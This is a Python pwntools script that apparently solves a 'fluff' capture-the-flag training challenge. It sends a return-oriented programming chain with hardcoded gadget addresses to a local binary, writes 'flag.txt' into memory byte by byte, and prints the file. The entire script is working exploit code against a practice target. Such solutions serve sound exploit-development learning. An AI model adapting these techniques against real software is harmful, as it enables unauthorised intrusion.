from pwn import *
io = process("./fluff")

padding = b"A" * 40

xlatRbx = p64(0x400628) #control rax
stosAl = p64(0x400639) #replace mov
popRegBextr = p64(0x40062a) #pop rdx first then rcx (used to control rbx)
shorterBextr = p64(0x40062b) #doesnt setup rdx so exploit shorter 

popRdi = p64(0x4006a3)
movEaxZeroPop = p64(0x400610)
printFilePlt = p64(0x400510)
addNum = 0x3ef2
stringLocation = p64(0x6010f0)
opcodeString = [0x4003c4,0x400239,0x4003d6,0x4003cf,0x40024e,0x400192,0x400246,0x400192] #These places hold opcodes that are flag.txt

exploit = padding + popRdi + stringLocation 
exploit += movEaxZeroPop + b"A" * 8 + popRegBextr + p64(0x4000) + p64(opcodeString[0] - addNum) + xlatRbx + stosAl 
for i in range(1,8):
    exploit += movEaxZeroPop + b"A" * 8 + shorterBextr + p64(opcodeString[i] - addNum) + xlatRbx + stosAl 

exploit += popRdi + stringLocation + printFilePlt
io.send(exploit)
io.recvuntil(b"Thank you!\n")
print(io.recv().decode()[:-1])
